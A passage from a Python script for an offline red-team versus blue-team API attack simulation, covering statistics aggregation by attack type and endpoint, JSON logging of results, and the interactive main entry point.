                attack_type_stats[attack_type] = {'total': 0, 'successful': 0, 'blocked': 0}
            attack_type_stats[attack_type]['total'] += 1
            if attempt.success:
                attack_type_stats[attack_type]['successful'] += 1
            if attempt.blocked:
                attack_type_stats[attack_type]['blocked'] += 1

            # Endpoint stats
            endpoint = attempt.endpoint
            if endpoint not in endpoint_stats:
                endpoint_stats[endpoint] = {'total': 0, 'successful': 0, 'blocked': 0}
            endpoint_stats[endpoint]['total'] += 1
            if attempt.success:
                endpoint_stats[endpoint]['successful'] += 1
            if attempt.blocked:
                endpoint_stats[endpoint]['blocked'] += 1

        log_data = {
            'simulation_summary': asdict(self.game_state),
            'ai_learning_results': {
                'red_team_strategy_weights': self.red_team.strategy_weights,
                'blue_team_sensitivity': self.ai_engine.blue_team_sensitivity,
                'blue_team_block_threshold': self.blue_team.block_threshold
            },
            'attack_type_statistics': attack_type_stats,
            'endpoint_statistics': endpoint_stats,
            'detailed_attacks': [asdict(attempt) for attempt in self.attack_log]
        }

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"local_warfare_simulation_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(log_data, f, indent=2)

        logging.info(f"📁 Detailed log saved to: {filename}")

def main():
    """Main entry point for the simulation"""
    print("🧠 AI vs AI — Simulated API Warfare in Cyberspace")
    print("🔥 Red Team vs Blue Team Cybersecurity Battle")
    print("🤖 Powered by Local AI Engine (No External Dependencies)")
    print("=" * 70)

    print("\n🎯 Features:")
    print("   • Local pattern-matching AI with learning capabilities")
    print("   • Context-aware attack generation and defense analysis")
    print("   • Evolutionary strategy adaptation")
    print("   • Real-time threat scoring and evasion techniques")
    print("   • Comprehensive logging and statistics")

    # Get simulation parameters
    try:
        rounds = int(input("\nEnter number of rounds to simulate (default 25): ") or "25")
        rounds = max(1, min(rounds, 200))  # Limit to reasonable range
    except ValueError:
        rounds = 25

    print(f"\n🚀 Starting simulation with {rounds} rounds...")
    print("   • No API costs or rate limits!")
    print("   • Full offline operation")
    print("   • Press Ctrl+C to stop early\n")

    try:
        simulation = WarfareSimulation(max_rounds=rounds)
        simulation.run_simulation()
    except Exception as e:
        print(f"❌ Error: {e}")
        logging.error(f"Simulation failed: {e}")

if __name__ == "__main__":
    main()
